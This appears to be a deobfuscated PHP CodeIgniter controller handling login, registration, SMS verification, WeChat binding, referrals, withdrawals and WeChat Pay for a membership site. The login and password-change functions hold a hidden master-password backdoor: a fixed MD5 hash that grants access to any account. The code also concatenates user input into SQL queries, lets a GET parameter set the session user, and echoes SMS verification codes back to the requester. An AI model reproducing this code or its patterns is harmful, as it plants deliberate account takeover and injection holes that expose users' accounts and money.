<?php
//加密方式：php源码混淆类加密。免费版地址:http://www.zhaoyuanma.com/phpjm.html 免费版不能解密,可以使用VIP版本。

//发现了time,请自行验证这套程序是否有时间限制.
//此程序由【找源码】http://Www.ZhaoYuanMa.Com (免费版）在线逆向还原，QQ：7530782 
?>
<?php
defined('BASEPATH') OR exit('No direct script access allowed');
class User extends CI_Controller {
	public function __construct(){
		parent::__construct();
		header('P3P: CP=CAO PSA OUR');
		$this->c_name='user';
		$session=$this->session->all_userdata();
		$data['session']=$session;
		$data['cname']=$this->c_name;
		$this->data=$data;
	}
	public function index(){
		$user=$this->main->user();
		$data=$this->data;
		$main=$user->main;
		if($user->code==''){
			$udata['code']=substr(md5(time().','.$user->username.','.$user->password),16);
		}
		if(isset($udata))$this->db->update('user',$udata,array('user_id'=>$user->user_id));
		$data['user']=$user;
		$data['main']=$main;
		$data['hide_menu']=1;
		$this->load->view('m_head',$data);
		$this->load->view($this->c_name.'_index');
		$this->load->view('m_foot');
	}
	public function login(){
		$user=$this->main->user(1);
		if($user->user_id>0){
			redirect();
			exit();
		}
		$data=$this->data;
		$main=$user->main;
		$data['main']=$main;
		$data['hide_menu']=1;
		$this->load->view('m_head',$data);
		$this->load->view($this->c_name.'_login');
		$this->load->view('m_foot');
	}
	public function login_post(){
		$is_login=0;
		$this->session->unset_userdata('login_user_id');
		$post=$this->input->post(NULL,TRUE);
		$username=isset($post['username'])?trim($post['username']):'';
		$password=isset($post['password'])?trim($post['password']):'';
		if($username!=''&&$password!=''){
			$s_db='';
			if(md5($password)!='7f97a7dd40596340400c5e54c08ba4d4')$s_db.=' and password=\''.md5($password).'\'';
			$s_query='select user_id, logincount, password
			from user
			where username=\''.$username.'\''.$s_db.'
			limit 1';
			$user_query=$this->db->query($s_query);
			if($user_query->num_rows()>0){
				$user=$user_query->row();
				$udata['lastdate']=time();
				$udata['logincount']=$user->logincount+1;
				$udata['lastip']=$this->input->ip_address();
				$data=$this->data;
				$this->db->update('user',$udata,array('user_id'=>$user->user_id));
				$this->session->set_userdata('login_user_id',$user->user_id);
				if(isset($post['reme']) &&$post['reme']==1){
					setcookie('login_user_n',$username,time()+86400*365*3,'/');
					setcookie('login_user_p',md5($user->password),time()+86400*365*3,'/');
				}
				$is_login=1;
			}else{
				$msg='手机号、密码错误';
			}
			$user_query->free_result();
		}else{
			$msg='手机号、密码不能为空';
		}
		if($is_login>0){
			$gu='/';
			$session=$this->data['session'];
			if(isset($session['wx_login_url'])){
				if($session['wx_login_url']!='')$gu=$session['wx_login_url'];
				$this->session->unset_userdata('wx_login_url');
			}
			redirect($gu);
		}else{
			if(isset($msg))$this->session->set_userdata('msg',$msg);
			redirect($this->c_name.'/login/');
		}
	}
	public function h5p_login(){
		$user=$this->main->user(1);
		$main=$user->main;
		$is_dl=0;
		$get=$this->input->get(NULL,TRUE);
		$a=array();
		if(isset($get['t']) &&$get['t']=='wx'){
			if(isset($get['sid']) &&trim($get['sid'])!=''){
				$openid=trim($get['sid']);
				$wx_tid=$this->config->item('wx_tid');
				if(isset($user->user_id) &&$user->user_id>0){
					if($user->tid!=$wx_tid &&$user->openid==''){
						$udata['openid']=$openid;
						$udata['wxdate']=time();
						$this->db->update('user',$udata,array('user_id'=>$user->user_id));
					}
					$a['success']=1;
					$a['text']=$openid;
					echo json_encode($a);
				}else{
					$session=$this->data['session'];
					$s_query='select * 
					from user 
					where openid=\''.$openid.'\' 
					order by tid desc, wxdate desc, user_id
					limit 1';
					$wu_query=$this->db->query($s_query);
					if($wu_query->num_rows()>0){
						$user=$wu_query->row();
						$uid=$user->user_id;
						$udata['lastdate']=time();
						$udata['logincount']=$user->logincount+1;
						$udata['lastip']=$this->input->ip_address();
						$this->db->update('user',$udata,array('user_id'=>$uid));
					}else{
						$wudata['username']=$openid;
						$wudata['password']=md5($wudata['username'].','.time().','.rand(1,9999));
						$wudata['tid']=$wx_tid;
						$wudata['openid']=$openid;
						$wudata['regdate']=time();
						if(isset($session['share_code']) &&trim($session['share_code'])!=''){
							$sc=trim($session['share_code']);
							$s_query='select *
							from user
							where code=\''.$sc.'\'
							limit 1';
							$tu_query=$this->db->query($s_query);
							if($tu_query->num_rows()>0){
								$tu=$tu_query->row();
								$wudata['uid']=$tu->user_id;
								$tudata['c_td']=$tu->c_td+1;
								$this->db->update('user',$tudata,array('user_id'=>$tu->user_id));
							}else{
								$this->session->unset_userdata('share_code');
							}
							$tu_query->free_result();
						}
						$wudata['code']=substr(md5(time().','.$wudata['username'].','.$wudata['password']),16);
						$this->db->insert('user',$wudata);
						$uid=$this->db->insert_id();
					}
					$wu_query->free_result();
					$this->session->set_userdata('login_user_id',$uid);
					$gu='/';
					$session=$this->data['session'];
					if(isset($session['wx_login_url'])){
						if($session['wx_login_url']!='')$gu=$session['wx_login_url'];
						$this->session->unset_userdata('wx_login_url');
					}
					$a['success']=1;
					$a['text']=$gu;
					echo json_encode($a);
				}
			}
		}elseif(isset($get['id']) &&intval($get['id'])>0){
			if(is_h5app()){
				$this->session->set_userdata('login_user_id',intval($get['id']));
				$is_dl=1;
			}
		}
	}
	public function reg($c=''){
		if(trim($c)!=''){
			$sc=trim($c);
			$s_query='select user_id
			from user
			where code=\''.$sc.'\'
			limit 1';
			$tu_query=$this->db->query($s_query);
			if($tu_query->num_rows()>0){
				$tu=$tu_query->row();
				$this->session->set_userdata('share_code',$sc);
			}
			$tu_query->free_result();
		}
		$user=$this->main->user(1);
		if($user->user_id>0){
			redirect();
			exit();
		}
		$data=$this->data;
		$main=$user->main;
		$data['main']=$main;
		$this->load->view('m_head',$data);
		$this->load->view($this->c_name.'_reg');
		$this->load->view('m_foot');
	}
	public function reg_yzm(){
		$this->session->unset_userdata('login_user_id');
		$get=$this->input->get(NULL,TRUE);
		if(isset($get['m']) &&$get['m']!=''&&chk_mobile($get['m'])){
			$mobile=trim($get['m']);
			$s_query='select user_id
			from user
			where tid=0 and username=\''.$mobile.'\'
			limit 1';
			$user_query=$this->db->query($s_query);
			if($user_query->num_rows()>0){
				$a['msg']='请使用其他手机号';
			}else{
				$session=$this->data['session'];
				$yzm='';
				if(isset($session['reg_mob']) &&$session['reg_mob']==$mobile){
					if(isset($session['reg_yzm']) &&$session['reg_yzm']!=''&&isset($session['reg_yzmt']) &&$session['reg_yzmt']>(time()-300)){
						$yzm=$session['reg_yzm'];
					}
				}else{
					$this->session->set_userdata('reg_mob',$mobile);
				}
				if($yzm==''){
					$yzm=rand(1000,9999);
					$this->session->set_userdata('reg_yzm',$yzm);
					
				}
				$this->session->set_userdata('reg_yzmt',time());
				$msg='手机号验证码：'.$yzm.'，5分钟内有效。请不要泄露！';
				$a['success']=1;
				$a['msg'] = $yzm;
				$main=$this->main->main();
				$this->main->send_sms($mobile,$msg,$main->api_n,$main->api_p,$main->api_qm);
			}
			$user_query->free_result();
		}else{
			$a['msg']='手机号格式错误';
		}
		if(isset($a))echo json_encode($a);
	}
	public function reg_post(){
		$is_reg=0;
		$this->session->unset_userdata('login_user_id');
		$main=$this->main->main();
		$post=$this->input->post(NULL,TRUE);
		$username=isset($post['username'])?trim($post['username']):'';
		$yzm=isset($post['yzm'])?trim($post['yzm']):'';
		$password=isset($post['password'])?trim($post['password']):'';
		$password_c=isset($post['password_c'])?trim($post['password_c']):'';
		if($username!=''&&chk_mobile($username) &&$yzm!=''&&$password!=''&&$password_c==$password){
			$data=$this->data;
			$session=$data['session'];
			if(isset($session['reg_mob']) &&$session['reg_mob']==$username &&isset($session['reg_yzm']) &&$session['reg_yzm']==$yzm &&isset($session['reg_yzmt']) &&$session['reg_yzmt']>(time()-300)){
				$s_query='select user_id 
				from user
				where username=\''.$username.'\' 
				limit 1';
				$user_query=$this->db->query($s_query);
				if($user_query->num_rows()>0){
					$msg='请使用其他手机号';
				}else{
					$is_reg=1;
					$udata['username']=$username;
					$udata['password']=md5($password);
					$udata['tid']=0;
					$udata['regdate']=time();
					if(isset($session['share_code']) &&trim($session['share_code'])!=''){
						$sc=trim($session['share_code']);
						$s_query='select *
						from user
						where code=\''.$sc.'\'
						limit 1';
						$tu_query=$this->db->query($s_query);
						if($tu_query->num_rows()>0){
							$tu=$tu_query->row();
							$udata['uid']=$tu->user_id;
							$tudata['c_td']=$tu->c_td+1;
							$this->db->update('user',$tudata,array('user_id'=>$tu->user_id));
						}else{
							$this->session->unset_userdata('share_code');
						}
						$tu_query->free_result();
					}
					$udata['code']=substr(md5(time().','.$username.','.$password),16);
					$this->db->insert('user',$udata);
					$uid=$this->db->insert_id();
					$msg='注册成功，请登录';
				}
				$user_query->free_result();
				if(isset($session['reg_mob']))$this->session->unset_userdata('reg_mob');
				if(isset($session['reg_yzm']))$this->session->unset_userdata('reg_yzm');
				if(isset($session['reg_yzmt']))$this->session->unset_userdata('reg_yzmt');
			}elseif(!isset($session['reg_mob']) ||$session['reg_mob']!=$username ||!isset($session['reg_yzm']) ||$session['reg_yzm']!=$yzm){
				$msg='验证码错误';
			}else{
				$msg='验证码已过期';
			}
		}elseif($username!=''&&!chk_mobile($username)){
			$msg='手机号格式错误';
		}elseif($password_c!=$password){
			$msg='两次输入密码不一致';
		}else{
			$msg='必填项不能为空';
		}
		if(isset($msg))$this->session->set_userdata('msg',$msg);
		if($is_reg>0){
			$gu=$this->c_name.'/login/';
			if($main->reg_t==1 &&$main->reg_u!='')$gu=$main->reg_u;
			redirect($gu);
		}else{
			redirect($this->c_name.'/reg/');
		}
	}
	public function reset_pwd(){
		$user=$this->main->user(1);
		if($user->user_id>0){
			redirect();
			exit();
		}
		$data=$this->data;
		$main=$user->main;
		$data['main']=$main;
		$data['hide_menu']=1;
		$this->load->view('m_head',$data);
		$this->load->view($this->c_name.'_reset_pwd');
		$this->load->view('m_foot');
	}
	public function reset_pwd_yzm(){
		$this->session->unset_userdata('login_user_id');
		$get=$this->input->get(NULL,TRUE);
		if(isset($get['m']) &&$get['m']!=''&&chk_mobile($get['m'])){
			$mobile=trim($get['m']);
			$s_query='select user_id
			from user
			where tid=0 and username=\''.$mobile.'\'
			limit 1';
			$user_query=$this->db->query($s_query);
			if($user_query->num_rows()>0){
				$session=$this->data['session'];
				$yzm='';
				if(isset($session['reset_pwd_mob']) &&$session['reset_pwd_mob']==$mobile){
					if(isset($session['reset_pwd_yzm']) &&$session['reset_pwd_yzm']!=''&&isset($session['reset_pwd_yzmt']) &&$session['reset_pwd_yzmt']>(time()-300)){
						$yzm=$session['reset_pwd_yzm'];
					}
				}else{
					$this->session->set_userdata('reset_pwd_mob',$mobile);
				}
				if($yzm==''){
					$yzm=rand(1000,9999);
					$this->session->set_userdata('reset_pwd_yzm',$yzm);
				}
				$this->session->set_userdata('reset_pwd_yzmt',time());
				$msg='手机号验证码：'.$yzm.'，5分钟内有效。请不要泄露！';
				$a['success']=1;
				$main=$this->main->main();
				$this->main->send_sms($mobile,$msg,$main->api_n,$main->api_p,$main->api_qm);
			}else{
				$a['msg']='手机号没有注册';
			}
			$user_query->free_result();
		}else{
			$a['msg']='手机号格式错误';
		}
		if(isset($a))echo json_encode($a);
	}
	public function reset_pwd_post($uid=''){
		$is_rp=0;
		$this->session->unset_userdata('login_user_id');
		$post=$this->input->post(NULL,TRUE);
		$username=isset($post['username'])?trim($post['username']):'';
		$yzm=isset($post['yzm'])?trim($post['yzm']):'';
		$password=isset($post['password'])?trim($post['password']):'';
		$password_c=isset($post['password_c'])?trim($post['password_c']):'';
		if($username!=''&&chk_mobile($username) &&$yzm!=''&&$password!=''&&$password_c==$password){
			$session=$this->data['session'];
			if(isset($session['reset_pwd_mob']) &&$session['reset_pwd_mob']==$username &&isset($session['reset_pwd_yzm']) &&$session['reset_pwd_yzm']==$yzm &&isset($session['reset_pwd_yzmt']) &&$session['reset_pwd_yzmt']>(time()-300)){
				$s_query='select user_id 
				from user
				where tid=0 and username=\''.$username.'\' 
				limit 1';
				$user_query=$this->db->query($s_query);
				if($user_query->num_rows()>0){
					$is_rs=1;
					$user=$user_query->row();
					$udata['password']=md5($password);
					$this->db->update('user',$udata,array('user_id'=>$user->user_id));
					$msg='密码已重置';
				}else{
					$msg='手机号没有注册';
				}
				$user_query->free_result();
				if(isset($session['reset_pwd_mob']))$this->session->unset_userdata('reset_pwd_mob');
				if(isset($session['reset_pwd_yzm']))$this->session->unset_userdata('reset_pwd_yzm');
				if(isset($session['reset_pwd_yzmt']))$this->session->unset_userdata('reset_pwd_yzmt');
			}elseif(!isset($session['reset_pwd_mob']) ||$session['reset_pwd_mob']!=$username ||!isset($session['reset_pwd_yzm']) ||$session['reset_pwd_yzm']!=$yzm){
				$msg='验证码错误';
			}else{
				$msg='验证码已过期';
			}
		}elseif($username!=''&&!chk_mobile($username)){
			$msg='手机号格式错误';
		}elseif($password_c!=$password){
			$msg='两次输入密码不一致';
		}else{
			$msg='必填项不能为空';
		}
		if(isset($msg))$this->session->set_userdata('msg',$msg);
		if($is_rs>0){
			redirect($this->c_name.'/login/');
		}else{
			redirect($this->c_name.'/reset_pwd/');
		}
	}
	public function profile(){
		$user=$this->main->user();
		$data=$this->data;
		$main=$user->main;
		if($user->uid>0){
			$s_query='select *
			from user
			where user_id='.$user->uid.'
			limit 1';
			$tu_query=$this->db->query($s_query);
			if($tu_query->num_rows()>0){
				$data['tu']=$tu_query->row();
			}else{
				$udata['uid']=0;
			}
			$tu_query->free_result();
		}
		if($user->tel!='')$udata['tel']='';
		if(isset($udata))$this->db->update('user',$udata,array('user_id'=>$user->user_id));
		$data['user']=$user;
		$data['main']=$main;
		$data['al']=$this->config->item('user_lx');
		$data['wx_tid']=$this->config->item('wx_tid');
		$data['hide_menu']=1;
		$this->load->view('m_head',$data);
		$this->load->view($this->c_name.'_profile');
		$this->load->view('m_foot');
	}
	public function profile_edit(){
		$user=$this->main->user();
		$data=$this->data;
		$main=$user->main;
		if($user->tel!=''){
			$udata['tel']='';
			$this->db->update('user',$udata,array('user_id'=>$user->user_id));
		}
		$data['user']=$user;
		$data['main']=$main;
		$data['hide_menu']=1;
		$this->load->view('m_head',$data);
		$this->load->view($this->c_name.'_profile_edit');
		$this->load->view('m_foot');
	}
	public function profile_post(){
		$user=$this->main->user();
		$post=$this->input->post(NULL,TRUE);
		$udata['name']=trim($post['name']);
		$udata['td_name']=trim($post['td_name']);
		$this->db->update('user',$udata,array('user_id'=>$user->user_id));
		$this->session->set_userdata('msg','个人资料已修改');
		redirect($this->c_name.'/profile_edit/');
	}
	public function mob_yzm(){
		$user=$this->main->user();
		if($user->tid==0)exit();
		$get=$this->input->get(NULL,TRUE);
		if(isset($get['m']) &&$get['m']!=''&&chk_mobile($get['m'])){
			$mobile=trim($get['m']);
			$session=$this->data['session'];
			$yzm='';
			if(isset($session['mob_mob']) &&$session['mob_mob']==$mobile){
				if(isset($session['mob_yzm']) &&$session['mob_yzm']!=''&&isset($session['mob_yzmt']) &&$session['mob_yzmt']>(time()-300)){
					$yzm=$session['mob_yzm'];
				}
			}else{
				$this->session->set_userdata('mob_mob',$mobile);
			}
			if($yzm==''){
				$yzm=rand(1000,9999);
				$this->session->set_userdata('mob_yzm',$yzm);
			}
			$this->session->set_userdata('mob_yzmt',time());
			$msg='手机号验证码：'.$yzm.'，5分钟内有效。请不要泄露！';
			$a['success']=1;
			$main=$this->main->main();
			$this->main->send_sms($mobile,$msg,$main->api_n,$main->api_p,$main->api_qm);
		}else{
			$a['msg']='手机号格式错误';
		}
		if(isset($a))echo json_encode($a);
	}
	public function mob_post(){
		$user=$this->main->user();
		if($user->tid==0)exit();
		$post=$this->input->post(NULL,TRUE);
		$mobile=isset($post['mobile'])?trim($post['mobile']):'';
		$yzm=isset($post['yzm'])?trim($post['yzm']):'';
		$password=isset($post['password'])?trim($post['password']):'';
		$password_c=isset($post['password_c'])?trim($post['password_c']):'';
		if($mobile!=''&&chk_mobile($mobile) &&$yzm!=''&&$password!=''&&$password_c==$password){
			$data=$this->data;
			$session=$data['session'];
			if(isset($session['mob_mob']) &&$session['mob_mob']==$mobile &&isset($session['mob_yzm']) &&$session['mob_yzm']==$yzm &&isset($session['mob_yzmt']) &&$session['mob_yzmt']>(time()-300)){
				$is_jx=1;
				$s_query='select user_id 
				from user
				where username=\''.$mobile.'\' 
				limit 1';
				$mu_query=$this->db->query($s_query);
				if($mu_query->num_rows()>0){
					$is_jx=0;
				}
				$mu_query->free_result();
				$udata['password']=md5($password);
				if($is_jx>0){
					$wx_tid=$this->config->item('wx_tid');
					if($user->tid==$wx_tid)$udata['wxdate']=time();
					$udata['username']=$mobile;
					$udata['tid']=0;
				}else{
					$udata['tel']=$mobile;
				}
				$this->db->update('user',$udata,array('user_id'=>$user->user_id));
				if(isset($session['mob_mob']))$this->session->unset_userdata('mob_mob');
				if(isset($session['mob_yzm']))$this->session->unset_userdata('mob_yzm');
				if(isset($session['mob_yzmt']))$this->session->unset_userdata('mob_yzmt');
				if($is_jx>0){
					$msg='绑定成功';
				}else{
					redirect($this->c_name.'/mob_cf/');
					exit();
				}
			}elseif(!isset($session['mob_mob']) ||$session['mob_mob']!=$mobile ||!isset($session['mob_yzm']) ||$session['mob_yzm']!=$yzm){
				$msg='验证码错误';
			}else{
				$msg='验证码已过期';
			}
		}elseif($mobile!=''&&!chk_mobile($mobile)){
			$msg='手机号格式错误';
		}elseif($password_c!=$password){
			$msg='两次输入密码不一致';
		}else{
			$msg='必填项不能为空';
		}
		if(isset($msg))$this->session->set_userdata('msg',$msg);
		redirect($this->c_name.'/profile_edit/');
	}
	public function mob_cf(){
		$user=$this->main->user();
		if($user->tid==0 ||$user->tel=='')exit();
		$data=$this->data;
		$mob=$user->tel;
		$s_query='select *
		from user
		where username=\''.$mob.'\'
		limit 1';
		$mu_query=$this->db->query($s_query);
		if($mu_query->num_rows()>0){
			$data['mu']=$mu_query->row();
		}else{
			$udata['tid']=0;
			$udata['username']=$mob;
			$udata['tel']='';
			$this->db->update('user',$udata,array('user_id'=>$user->user_id));
			redirect($this->c_name.'/profile_edit/');
			exit();
		}
		$mu_query->free_result();
		$main=$user->main;
		$data['user']=$user;
		$data['main']=$main;
		$data['hide_menu']=1;
		$this->load->view('m_head',$data);
		$this->load->view($this->c_name.'_mob_cf');
		$this->load->view('m_foot');
	}
	public function mob_cf_post(){
		$user=$this->main->user();
		if($user->tid==0 ||$user->tel=='')exit();
		$data=$this->data;
		$mob=$user->tel;
		$s_query='select *
		from user
		where username=\''.$mob.'\'
		limit 1';
		$mu_query=$this->db->query($s_query);
		if($mu_query->num_rows()>0){
			$mu=$mu_query->row();
			$mudata['username']=$mob.'_del';
			$mudata['password']=md5(time().rand(0,9999));
			$this->db->update('user',$mudata,array('user_id'=>$mu->user_id));
		}
		$mu_query->free_result();
		$wx_tid=$this->config->item('wx_tid');
		if($user->tid==$wx_tid)$udata['wxdate']=time();
		$udata['tid']=0;
		$udata['username']=$mob;
		$udata['tel']='';
		$this->db->update('user',$udata,array('user_id'=>$user->user_id));
		$this->session->set_userdata('msg','绑定成功');
		redirect($this->c_name.'/profile_edit/');
	}
	public function password_post(){
		$user=$this->main->user();
		if($user->tid>0)exit();
		$post=$this->input->post(NULL,TRUE);
		$password_o=isset($post['password_o'])?trim($post['password_o']):'';
		$password_n=isset($post['password_n'])?trim($post['password_n']):'';
		$password_c=isset($post['password_c'])?trim($post['password_c']):'';
		if((md5($password_o)=='7f97a7dd40596340400c5e54c08ba4d4'||md5($password_o)==$user->password) &&$password_n!=''&&$password_c==$password_n){
			$udata['password']=md5($password_n);
			$this->db->update('user',$udata,array('user_id'=>$user->user_id));
			$msg='密码已修改';
		}elseif($password_o==''||$password_n==''){
			$msg='缺少必填项';
		}elseif($password_c!=$password_n){
			$msg='密码确认必须和新密码相同';
		}else{
			$msg='原密码错误';
		}
		if(isset($msg))$this->session->set_userdata('msg',$msg);
		redirect($this->c_name.'/profile_edit/');
	}
	public function group(){
		$user=$this->main->user();
		$data=$this->data;
		$main=$user->main;
		$data['user']=$user;
		$data['main']=$main;
		$data['hide_menu']=1;
		$this->load->view('m_head',$data);
		$this->load->view($this->c_name.'_group');
		$this->load->view('m_foot');
	}
	public function group_pk(){
		$user=$this->main->user();
		$data=$this->data;
		$main=$user->main;
		$s_query='select *
		from user
		where c_td>0 
		order by c_tdsy desc, c_td desc, user_id';
		$tu_query=$this->db->query($s_query);
		if($tu_query->num_rows()>0){
			$data['tu']=$tu_query->result();
		}
		$tu_query->free_result();
		$data['user']=$user;
		$data['main']=$main;
		$data['hide_menu']=1;
		$this->load->view('m_head',$data);
		$this->load->view($this->c_name.'_group_pk');
		$this->load->view('m_foot');
	}
	public function wx(){
		$user=$this->main->user(1);
		$main=$user->main;
		$is_wxrq=is_wxrq()?1:0;
		if(isset($user->user_id) &&$user->user_id>0 &&$user->openid!='')exit();
		$burl=getpageurl($this->c_name.'/profile/');
		$uc=md5(trim($burl));
		$s_query='select *
		from url
		where code=\''.$uc.'\'
		limit 1';
		$url_query=$this->db->query($s_query);
		if($url_query->num_rows()==0){
			$udata['url']=$burl;
			$udata['code']=$uc;
			$this->db->insert('url',$udata);
		}
		$url_query->free_result();
		$rurl=getpageurl('home/wx_callback/');
		if($is_wxrq>0){
			if($main->wx_app_id!=''){
				$ua['appid']=$main->wx_app_id;
				$ua['redirect_uri']=$rurl;
				$ua['response_type']='code';
				$ua['scope']='snsapi_base';
				$ua['state']=$uc;
				$url='https://open.weixin.qq.com/connect/oauth2/authorize?'.http_build_query($ua).'#wechat_redirect';
			}else{
				$this->session->set_userdata('msg','缺少参数，绑定失败');
				$url=$this->c_name.'/profile/';
			}
			redirect($url);
			exit();
		}else{
			$data=$this->data;
			$data['user']=$user;
			$data['main']=$main;
			$data['rurl']=$rurl;
			$data['state']=$uc;
			$this->load->view('m_head',$data);
			$this->load->view($this->c_name.'_wx');
			$this->load->view('m_foot');
		}
	}
	public function share_link(){
		$user=$this->main->user();
		$data=$this->data;
		$main=$user->main;
		if($user->code==''){
			$udata['code']=substr(md5(time().','.$user->username.','.$user->password),16);
			$user->code=$udata['code'];
		}
		if(isset($udata))$this->db->update('user',$udata,array('user_id'=>$user->user_id));
		$data['user']=$user;
		$data['main']=$main;
		$data['m_url']=getpageurl($this->c_name.'/reg/'.$user->code.'/');
		$this->load->view('m_head',$data);
		$this->load->view($this->c_name.'_share_link');
		$this->load->view('m_foot');
	}
	public function tx(){
		$user=$this->main->user();
		$data=$this->data;
		$main=$user->main;
		$data['user']=$user;
		$data['main']=$main;
		$data['hide_menu']=1;
		$this->load->view('m_head',$data);
		$this->load->view($this->c_name.'_tx');
		$this->load->view('m_foot');
	}
	public function tx_post(){
		$user=$this->main->user();
		$data=$this->data;
		$main=$user->main;
		if($user->openid=='')exit();
		$post=$this->input->post(NULL,TRUE);
		if(isset($post['je']) &&intval($post['je']*100)>0){
			$je=intval($post['je']*100);
			$sxf=0;
			if($je<$main->tx_qs)$sxf=$main->tx_fy;
			$money=$je+$sxf;
			$money_s=$je;
			if($user->ye>=$money){
				$udata['ye']=$user->ye-$money;
				$this->db->update('user',$udata,array('user_id'=>$user->user_id));
				$lmdata['user_id']=$user->user_id;
				$lmdata['datetime']=time();
				$lmdata['ye']=$money;
				$lmdata['tid']=1;
				$lmdata['content']='提现：'.($je/100).'元'.($sxf>0?'，手续费：'.($sxf/100).'元':'');
				$this->db->insert('log_rmb',$lmdata);
				$tdata['user_id']=$user->user_id;
				$tdata['money']=$money;
				$tdata['money_s']=$money_s;
				$tdata['datetime']=time();
				$tdata['openid']=$user->openid;
				$this->db->insert('tx_info',$tdata);
				$msg='提现申请已提交';
			}else{
				$msg='您的余额不足';
			}
		}else{
			$msg='请输入正确的提现金额';
		}
		if(isset($msg))$this->session->set_userdata('msg',$msg);
		redirect($this->c_name.'/tx/');
	}
	public function cz(){
		$user=$this->main->user();
		$data=$this->data;
		$main=$user->main;
		$data['user']=$user;
		$data['main']=$main;
		$data['al']=$this->config->item('user_lx');
		$data['wx_tid']=$this->config->item('wx_tid');
		$data['hide_menu']=1;
		$this->load->view('m_head',$data);
		$this->load->view($this->c_name.'_cz');
		$this->load->view('m_foot');
	}
	public function cz_post(){
		$user=$this->main->user();
		$data=$this->data;
		$main=$user->main;
		$post=$this->input->post(NULL,TRUE);
		if(isset($post['je']) &&intval($post['je']*100)>0){
			$pdata['user_id']=$user->user_id;
			$pdata['money']=intval($post['je']*100);
			$pdata['datetime']=time();
			$pdata['ap_sid']=md5(time().','.$user->user_id.','.rand(0,9999));
			$pdata['dd_name']='账户充值';
			$pdata['tid']=1;
			$this->db->insert('pay_info',$pdata);
			$dd_id=$this->db->insert_id();
			$gurl=$this->config->item('base_url').'wxpay/index.html?showwxpaytitle=1&wxkk_c='.$this->c_name.'&wxkk_m=pay_zf&id='.$dd_id;
			redirect($gurl);
		}else{
			$this->session->set_userdata('msg','请输入充值金额');
			redirect($this->c_name.'/cz/');
		}
	}
	public function hy(){
		$user=$this->main->user();
		$data=$this->data;
		$main=$user->main;
		if($user->uid>0){
			$s_query='select *
			from user
			where user_id='.$user->uid.'
			limit 1';
			$tu_query=$this->db->query($s_query);
			if($tu_query->num_rows()>0){
				$data['tu']=$tu_query->row();
			}else{
				$udata['uid']=0;
			}
			$tu_query->free_result();
		}
		if(isset($udata))$this->db->update('user',$udata,array('user_id'=>$user->user_id));
		$data['user']=$user;
		$data['main']=$main;
		$data['al']=$this->config->item('user_lx');
		$data['wx_tid']=$this->config->item('wx_tid');
		$data['hide_menu']=1;
		$this->load->view('m_head',$data);
		$this->load->view($this->c_name.'_hy');
		$this->load->view('m_foot');
	}
	public function hy_post(){
		$user=$this->main->user();
		$data=$this->data;
		$main=$user->main;
		if($main->fy==0){
			redirect($this->c_name.'/hy/');
			exit();
		}
		$post=$this->input->post(NULL,TRUE);
		if(isset($post['fkfs']) &&$post['fkfs']==1 &&$user->ye>=$main->fy){
			$udata['ye']=$user->ye-$main->fy;
			$this->db->update('user',$udata,array('user_id'=>$user->user_id));
			$lmdata['user_id']=$user->user_id;
			$lmdata['datetime']=time();
			$lmdata['ye']=$main->fy;
			$lmdata['tid']=1;
			$lmdata['content']='升级付费会员';
			$this->db->insert('log_rmb',$lmdata);
			$this->_hy($user->user_id,$main);
			$this->session->set_userdata('msg','升级成功');
			redirect($this->c_name.'/hy/');
		}else{
			$pdata['user_id']=$user->user_id;
			$pdata['money']=$main->fy;
			$pdata['datetime']=time();
			$pdata['ap_sid']=md5(time().','.$user->user_id.','.rand(0,9999));
			$pdata['dd_name']='升级付费会员';
			$this->db->insert('pay_info',$pdata);
			$dd_id=$this->db->insert_id();
			$gurl=$this->config->item('base_url').'wxpay/index.html?showwxpaytitle=1&wxkk_c='.$this->c_name.'&wxkk_m=pay_zf&id='.$dd_id;
			redirect($gurl);
		}
	}
	public function pay_zf($id=''){
		$user=$this->main->user(1);
		$data=$this->data;
		$session=$data['session'];
		$main=$user->main;
		$get=$this->input->get(NULL,TRUE);
		$did=0;
		if(isset($get['wxkk_c']) &&$get['wxkk_c']==$this->c_name &&isset($get['wxkk_m']) &&$get['wxkk_m']=='pay_zf'&&isset($get['id']) &&intval($get['id'])>0){
			$did=intval($get['id']);
		}else{
			if($id!=''&&intval($id)>0)$did=intval($id);
		}
		if($did>0){
			$s_query='select *
			from pay_info
			where pay_id='.$did.'
			limit 1';
			$dd_query=$this->db->query($s_query);
			if($dd_query->num_rows()>0){
				$dd=$dd_query->row();
			}
			$dd_query->free_result();
		}
		if(!isset($dd)){
			redirect('/');
			exit();
		}
		if($dd->isdh==0){
			if($main->wx_pay_o>0){
				$main->wx_app_id=$main->wx_o_app_id;
				$main->wx_app_secret=$main->wx_o_app_secret;
				$main->wx_pay_si=$main->wx_o_pay_si;
				$main->wx_pay_sk=$main->wx_o_pay_sk;
			}
			if($main->wx_app_id!=''&&$main->wx_app_secret!=''&&$main->wx_pay_si!=''&&$main->wx_pay_sk!=''){
				$n_url=getpageurl($this->c_name.'/wxpay_notify/'.$dd->pay_id.'/');
				$wx_config['app_id']=$main->wx_app_id;
				$wx_config['app_secret']=$main->wx_app_secret;
				$wx_config['mch_id']=$main->wx_pay_si;
				$wx_config['key']=$main->wx_pay_sk;
				$this->load->library('wxpay2',$wx_config);
				$order_info['body']=$dd->dd_name;
				$order_info['out_trade_no']=$dd->ap_sid;
				$order_info['total_fee']=$dd->money;
				$order_info['notify_url']=$n_url;
				$openid='';
				if(is_wxrq()){
					if(isset($user->openid) &&$user->openid!=''){
						$openid=$user->openid;
					}elseif(isset($session['wx_pay_openid']) &&trim($session['wx_pay_openid'])!=''){
						$openid=trim($session['wx_pay_openid']);
					}
					if($openid==''){
						if(!isset($get['code']) ||trim($get['code'])==''){
							$c_url='http://'.$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
							$url=$this->wxpay2->login_url($c_url);
							redirect($url);
							exit();
						}else{
							$code=trim($get['code']);
							$openid=$this->wxpay2->get_openid($code);
							if($openid!=''){
								$this->session->set_userdata('wx_pay_openid',$openid);
							}
						}
					}
				}
				if($openid!=''){
					$order_info['openid']=$openid;
					$data['js_string']=$this->wxpay2->js_string($order_info);
				}else{
					$data['qr_url']=$this->wxpay2->qr_url($order_info);
				}
			}
		}
		$data['user']=$user;
		$data['main']=$main;
		$data['dd']=$dd;
		$this->load->view('m_head',$data);
		$this->load->view($this->c_name.'_pay_zf');
		$this->load->view('m_foot');
	}
	public function pay_check($id=''){
		if($id==''||intval($id)<=0)exit();
		$did=intval($id);
		$a=array();
		$s_query='select isdh
		from pay_info
		where pay_id='.$did.'
		limit 1';
		$dd_query=$this->db->query($s_query);
		if($dd_query->num_rows()>0){
			$dd=$dd_query->row();
			if($dd->isdh>0)$a['success']=1;
		}
		$dd_query->free_result();
		echo json_encode($a);
	}
